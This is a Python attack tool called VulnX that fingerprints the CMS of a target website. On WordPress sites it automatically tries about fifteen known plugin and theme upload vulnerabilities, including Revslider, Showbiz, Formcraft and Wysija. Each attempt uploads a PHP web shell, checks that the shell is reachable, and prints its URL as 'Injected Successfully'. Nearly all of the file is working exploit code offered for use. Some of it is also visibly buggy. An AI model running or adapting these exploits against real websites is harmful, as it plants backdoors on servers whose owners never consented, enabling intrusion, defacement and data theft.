#!/usr/bin/env python

# Title : VulnX
# Author: BENSAAD Anouar
# Desc  : CMS-Detector and Vulnerability Scanner & exploiter
import sys
import argparse
import re
import requests
import os
import datetime
import random
import socket
import urllib3


#BannerCOLOR
red = '\033[91m'
green = '\033[1;32m'
bg = '\033[0;32;47m'
#DEFAULTCOLOR
B = '\033[1;3;94m' #blue
R = '\033[1;3;91m' # red
W = '\033[1;97m'  # white
Y = '\033[1;3;93m' # yellow
G = '\033[1;3;92m' # green
os.system('clear')
now = datetime.datetime.now()
year = now.strftime('%Y')
month= now.strftime('%m')
headers = {
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
            "Keep-Alive": "timeout=15",
            "verify" : False
}
################ BANNER #####################

def banner():
    print("""%s
                   __     __     _      %s__  __%s
                   \ \   / /   _| |_ __ %s\ \/ /%s
                    \ \ / / | | | | '_ \ %s\  /%s
                     \ V /| |_| | | | | |%s/  \%s
                      \_/  \__,_|_|_| |_%s/_/\_\%s
                # Coded By Anouar Ben Saad -%s @anouarbensaad
    """ % (red,green,red,green,red,green,red,green,red,green,G,W))

def parser_error(errmsg):
    banner()
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    print(R + "Error: " + errmsg + W)
    sys.exit()

def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u google.com")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-u', '--url', help="Url scanned for")
    parser.add_argument('-f', '--file', help='Insert your file to scanning for',required=False)
    parser.add_argument('-d', '--domain-info', help='Get Info from WEB')
    parser.add_argument('-o', '--output', help='Save the results to text file')
    return parser.parse_args()

################ Check Files #####################

#def pathfile():

#    with open (file_name) as sites:

#        for url in sites:

#            detect_cms()

################ DETECT CMS #####################

def detect_cms():
    id = 0
    try:
        r=requests.get(url, headers)
        content = r.text
        joomla = re.findall("com_content | Joomla!", content)
        wordpress = re.findall("wp-content|[w,W]ord[p,P]ress", content)
        drupal = re.findall("Drupal|drupal|sites\/all|drupal.org", content)
        prestashop = re.findall("[P,p]restashop", content)
        if joomla:
            print ('%s[%i] Target -> %s %s CMS : Joomla \n\n%s' % (W,id,url,G,W))
            print ('%s [~] Check Vulnerability %s' %(Y,W))
        elif prestashop:
            print ('%s[%i] %s %s CMS : Prestashop \n\n%s' % (W,id,url,G,W))
            print ('%s [~] Check Vulnerability %s' %(Y,W))
        elif wordpress:
            print ('%s Target[%i] -> %s%s \n\n '% (W,id,url,W))
            print ('%s [+] CMS : Wordpress%s' % (G,W))
            wp_version()
            domain_info()
            print ('%s [~] Check Vulnerability %s' %(Y,W))
            #WP_PLUGIN_EXPLOITS CALLFUNCTIONS
            wp_wysija()
            wp_blaze()
            wp_catpro()
            wp_cherry()
            wp_dm()
            wp_fromcraft()
            wp_jobmanager()
            wp_showbiz()
            wp_synoptic()
            wp_shop()
            wp_injection()
            wp_powerzoomer()
            wp_revslider()
            wp_adsmanager()
            wp_inboundiomarketing()
        elif drupal:
            print ('%s Target[%i] -> %s %s\n\n '% (W,id,url,W))
            print ('%s [+] CMS : Drupal%s' % (G,W))
            drupal_version()
            domain_info()
            print ('%s [~] Check Vulnerability %s' %(Y,W))
        else:
            print ('%s[%i] %s %s CMS : Unknown \n\n%s' % (W,id,url,G,W))
            prestashop_version()
            domain_info()
            print ('%s [~] Check Vulnerability %s' %(Y,W))
    except Exception as e:
        print ('%s\n\nerror : %s%s' % (R,e,W))
        

################ WP Version #####################
def wp_version():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
        }
    ep = url
    uknownversion = "UKNOWN"
    response = requests.get(ep,headers)
    regex = '[W,w]ord[P,p]ress \d{1,7}.\d{0,9}'
    regex = re.compile(regex)
    matches = regex.findall(response.text)
    if len(matches) > 0 and matches[0] != None and matches[0] != "":
        version = matches[0]
        return print ('%s [*] WordPress Version : %s %s' %(B,version,W))

    else:
        return print ('%s [!] WordPress Version : %s %s' %(R,uknownversion,W))

################ Drupal Version #####################
def drupal_version():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
        }
    ep = url
    uknownversion = "UKNOWN"
    response = requests.get(ep,headers)
    regex = 'Drupal \d{0,10}'
    regex = re.compile(regex)
    matches = regex.findall(response.text)
    if len(matches) > 0 and matches[0] != None and matches[0] != "":
        version = matches[0]
        return print ('%s [*] Drupal Version : %s %s' %(B,version,W))

    else:
        return print ('%s [!] Drupal Version : %s %s' %(R,uknownversion,W))

################ Prestashop Version #####################
def prestashop_version():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
    }
    ep = url
    uknownversion = "UKNOWN"
    response = requests.get(ep,headers,Verify=False)
    regex = 'Prestashop \d{0,9}'
    regex = re.compile(regex)
    matches = regex.findall(response.text)
    if len(matches) > 0 and matches[0] != None and matches[0] != "":
        version = matches[0]
        return print ('%s [*] Prestashop Version : %s %s' %(B,version,W))
    else:
        return print ('%s [!] Prestashop Version : %s %s' %(R,uknownversion,W))

################ SCAN DOMAIN INFO #####################

def domain_info():
    print ('%s [~] Domain Info %s' %(Y,W))
    http = '^http://www.'
    https= '^https://www.'
    httpw= '^http://'
    httpsw= '^https://'
    check_httpw = re.findall(httpw,url)
    check_httpsw= re.findall(httpsw,url)
    check_http = re.findall(http,url)
    check_https= re.findall(https,url)
    try:
        if check_http:
            regex = re.compile(http)
            domain = re.sub(regex,'',url)
            ip = socket.gethostbyname(domain)
            print ('%s [*] IP  : %s%s' %(B,ip,W))
            print ('%s [*] DOMAIN  : %s%s' %(B,domain,W))
        elif check_https:
            regex = re.compile(https)
            domain = re.sub(regex,'',url)
            ip = socket.gethostbyname(domain)
            print ('%s [*] IP  : %s%s' %(B,ip,W))
            print ('%s [*] DOMAIN  : %s%s' %(B,domain,W))
        elif check_httpw:
            regex = re.compile(httpw)
            domain = re.sub(regex,'',url)
            ip = socket.gethostbyname(domain)
            print ('%s [*] IP  : %s%s' %(B ,ip,W))
            print ('%s [*] DOMAIN  : %s%s' %(B,domain,W))
        elif check_httpsw:
            regex = re.compile(httpsw)
            domain = re.sub(regex,'',url)
            ip = socket.gethostbyname(domain)
            print ('%s [*] IP  : %s%s' %(B ,ip,W))
            print ('%s [*] DOMAIN  : %s%s' %(B,domain,W))
    except Exception as e:
        print ('%s [!] IP  : %s%s' %(R,e,W))
        print ('%s [*] DOMAIN  : %s%s' %(B,url,W))

################ Blaze Plugin #####################

def wp_blaze():
    headers['Content_Type']:'multipart/form-data'
    options = {
               'album_img':[open('./shell/VulnX.php','rb')],
               'task':'blaze_add_new_album',
               'album_name':'',
               'album_desc':''
        }
    endpoint = url + "/wp-admin/admin.php?page=blaze_manage"
    send_shell = requests.post(endpoint,options,headers)
    content  = send_shell.text
    check_blaze = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
    if check_blaze:
        uploadfolder = check_blaze.group(1)
        dump_data = url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/VulnX.php?Vuln=X"
        print ('%s [%s+%s] Blaze Plugin%s -------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W ))
    else: 
        print ('%s [%s-%s] Blaze Plugin%s -------------- %s FAIL%s' %(W,R,W,W,R,W))    

################ Catpro Plugin #####################

def wp_catpro():
    headers['Content_Type']:'multipart/form-data'
    options = {
            'album_img':[open('./shell/VulnX.php','rb')],
            'task':'cpr_add_new_album',
            'album_name':'',
            'album_desc':''
    }
    endpoint = url + "/wp-admin/admin.php?page=catpro_manage"
    send_shell = requests.post(endpoint,options,headers)
    content  = send_shell.text
    check_catpro = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
    if check_catpro:
        uploadfolder = check_catpro.group(1)
        dump_data = url + "/wp-content/uploads/catpro/"+uploadfolder+"/big/VulnX.php?Vuln=X"
        print ('%s [%s+%s] Catpro Plugin%s ------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Catpro Plugin%s ------------- %s FAIL%s' %(W,R,W,W,R,W))    

################ Cherry Plugin #####################

def  wp_cherry():
    headers['Content_Type']:'multipart/form-data'
    options = {
            'file':open('./shell/VulnX.php','rb')
    }
    endpoint = url + "/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
    send_shell = requests.post(endpoint,options,headers)
    response  = send_shell.text
    dump_data  = url + "/wp-content/plugins/cherry-plugin/admin/import-export/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    content  = response.text
    check_cherry = re.findall("Vuln X", content)
    if check_cherry:
        print ('%s [%s+%s] Cherry Plugin%s ------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*]Shell Uploaded Successfully \n %s link : %s%s ' % ( B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Cherry Plugin%s ------------- %s FAIL%s' %(W,R,W,W,R,W))    

################ Download Manager Plugin #####################
def wp_dm():
    headers['Content_Type']:'multipart/form-data'
    options = {
            'upfile':open('./shell/VulnX.php','rb'),
            'dm_upload':''
    }
    send_shell = requests.post(url,options,headers)
    dump_data = url + "/wp-content/plugins/downloads-manager/upload/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    content  = response.text
    check_dm = re.findall("Vuln X", content)
    if check_dm:
        print ('%s [%s+%s] Download Manager Plugin%s---- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W))
    else:
        print ('%s [%s-%s] Download Manager Plugin%s --- %s FAIL%s' %(W,R,W,W,R,W))    

################ powerzoomer Plugin #####################

def wp_powerzoomer():
    endpoint = url + "/wp-admin/admin.php?page=powerzoomer_manage"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
               'album_img':[open('./shell/VulnX.php','rb')],
               'task':'pwz_add_new_album',
               'album_name':'',
               'album_desc':''
        }
    send_shell = requests.post(endpoint,options,headers)
    response  = send_shell.text
    check_powerzoomer = re.findall("\/uploads\/powerzoomer\/(.*?)\/big\/VulnX.php", response)
    if check_powerzoomer:
        uploadfolder = check_powerzoomer.group(1)
        dump_data = url + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnX.php?Vuln=X"
        print ('%s [%s+%s] Powerzoomer Content%s ------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,dump_data,W ))
    else:
        print ('%s [%s-%s] Powerzoomer Content%s ------- %s FAIL%s' %(W,R,W,W,R,W))

def wp_revslider():
    endpoint = url + "/wp-admin/admin-ajax.php"
    headers={
        'Cookie':'',
        'Content_Type' : 'form-data',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
    }
    options = {
        'action':'revslider_ajax_action',
        'client_action':'update_plugin',
        'update_file':[open('./shell/VulnX.zip','rb')]
    }
    send_shell = requests.post(endpoint,options,headers)
    revslidera=requests.get(url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderb=requests.get(url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderc=requests.get(url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderd=requests.get(url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revslidere=requests.get(url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderf=requests.get(url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderg=requests.get(url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderh=requests.get(url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revslideri=requests.get(url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderj=requests.get(url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderk=requests.get(url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderl=requests.get(url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderm=requests.get(url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    check_revslidera = re.findall("Vuln X", revslidera)
    check_revsliderb = re.findall("Vuln X", revsliderb)
    check_revsliderc = re.findall("Vuln X", revsliderc)
    check_revsliderd = re.findall("Vuln X", revsliderd)
    check_revslidere = re.findall("Vuln X", revslidere)
    check_revsliderf = re.findall("Vuln X", revsliderf)
    check_revsliderg = re.findall("Vuln X", revsliderg)
    check_revsliderh = re.findall("Vuln X", revsliderh)
    check_revslideri = re.findall("Vuln X", revslideri)
    check_revsliderj = re.findall("Vuln X", revsliderj)
    check_revsliderk = re.findall("Vuln X", revsliderk)
    check_revsliderl = re.findall("Vuln X", revsliderl)
    check_revsliderm = re.findall("Vuln X", revsliderm)
    if check_revslidera:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderb:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderc:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderd:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revslidere:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderf:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderg:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderh:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revslideri:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderj:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderk:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderl:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderm:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    else:
        print ('%s [%s-%s] Revslider Plugin%s ---------- %s FAIL%s' %(W,R,W,W,R,W))


################ Fromcraft Plugin #####################
def wp_fromcraft():
    shell = open('./shell/VulnX.php','rb')
    fields= "files[]"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            fields:shell
    }
    endpoint = url + "/wp-content/plugins/formcraft/file-upload/server/php/"
    send_shell = requests.post(endpoint,options,headers)
    response  = send_shell.text
    dump_data  = url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnX.php?Vuln=X"
    check_fromcraft = re.findall("\"files", response)
    if check_fromcraft:
        print ('%s [%s+%s] Fromcraft Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W ))
    else:
        print ('%s [%s-%s] Fromcraft Plugin%s ---------- %s FAIL%s' %(W,R,W,W,R,W))    

################ Job Manager Plugin #####################

def wp_jobmanager():
    endpoint = url + "/jm-ajax/upload_file/"
    image = open('./shell/vulnx.gif','rb')
    field = "file[]"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            field:image
    }

    send_image = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/vulnx.gif"
    response=requests.get(dump_data, headers)
    res  = response.headers['content-type']
    check_jobmanager = re.findall("image\/gif", res)
    
    if check_jobmanager:
        print ('%s [%s+%s] Job Manager Plugin%s -------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Job Manager Plugin%s -------- %s FAIL%s' %(W,R,W,W,R,W))

################ Showbiz Plugin #####################

def wp_showbiz():
    endpoint = url + "/wp-admin/admin-ajax.php"
    def random_UserAgent():
        useragents_rotate = [
            "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31"
        ]
        useragents_random = random.choice(useragents_rotate)
        return useragents_random
    useragent=random_UserAgent()
    headers['User-Agent'] = useragent
    headers['Content_Type'] = 'multipart/form-data'
    options = {
                "action":"showbiz_ajax_action",
                "client_action":"update_plugin",
                "update_file":[open('./shell/VulnX.php','rb')]
            }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/plugins/showbiz/temp/update_extract/VulnX.php?Vuln=X"
    response=requests.get(dump_data, options)
    res  = response.text
    check_showbiz = re.findall("Vuln X", res)
    if check_showbiz:
        print ('%s [%s+%s] ShowBiz Plugin%s ------------ %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] ShowBiz Plugin%s ------------ %s FAIL%s' %(W,R,W,W,R,W))

################ Synoptic Plugin #####################

def wp_synoptic():
    endpoint = url + "/wp-content/themes/synoptic/lib/avatarupload/upload.php"
    shell = open('./shell/VulnX.php','rb')
    field = "qqfile"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            field:shell
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/markets/avatars/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_synoptic = re.findall("Vuln X", res)
    
    if check_synoptic:
        print ('%s [%s+%s] Synoptic Plugin%s ----------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Synoptic Plugin%s ----------- %s FAIL%s' %(W,R,W,W,R,W))

################ Wpshop Plugin #####################

def wp_shop():
    endpoint = url + "/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload"
    shell = open('./shell/VulnX.php','rb')
    field = "wpshop_file"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            field:shell
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_shop = re.findall("Vuln X", res)
    if check_shop:
        print ('%s [%s+%s] WPShop Plugin%s ------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] WPShop Plugin%s ------------- %s FAIL%s' %(W,R,W,W,R,W))

################ Content Injection #####################

def wp_injection():
    endpoint = url + "index.php/wp-json/wp/v2/posts/"
    check_shop = False
    a="a"
    if check_shop:
        print ('%s [%s+%s] Injection Content%s ----------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,a,W))
    else:
        print ('%s [%s-%s] Injection Content%s --------- %s FAIL%s' %(W,R,W,W,R,W))


################ Ads Manager Plugin #####################

def wp_adsmanager():
    endpoint = url + "/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php"
    shell = open('./shell/VulnX.php','rb')
    field = "wpshop_file"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            'uploadfile':shell,
            'action':'upload_ad_image',
            'path':''
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/plugins/simple-ads-manager/VulnX.php?Vuln=X/"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_adsmanager = re.findall("{\"status\":\"success\"}", res)
    if check_adsmanager:
        print ('%s [%s+%s] Simple Ads Manager%s -------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Simple Ads Manager%s -------- %s FAIL%s' %(W,R,W,W,R,W))

################ Wysija Theme #####################

def wp_wysija():
    theme = "my-theme"
    endpoint = url + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
    shell = open('./shell/VulnX.php','rb')
    
    field = "wpshop_file"
    headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
    headers['Content_Type'] = 'form-data'
    options = {
            'theme':shell,
            'overwriteexistingtheme':'on',
            'action':'themeupload',
            'submitter':'Upload'
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/wysija/themes/VulnX/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_wysija = re.findall("Vuln X", res)
    if check_wysija:
        print ('%s [%s+%s] Wysija Theme%s -------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Wysija Theme%s -------------- %s FAIL%s' %(W,R,W,W,R,W))

################ Ads Manager Plugin #####################

def wp_inboundiomarketing():
    endpoint = url + "/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
    shell = open('./shell/VulnX.php','rb')
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            'file':shell,
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_wysija = re.findall("Vuln X", res)
    if check_wysija:
        print ('%s [%s+%s] InBoundio Marketing%s ------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] InBoundio Marketing%s ------- %s FAIL%s' %(W,R,W,W,R,W))


if __name__ == "__main__":
    args = parse_args()
    url = args.url
    file_name = args.file
    banner()
    detect_cms()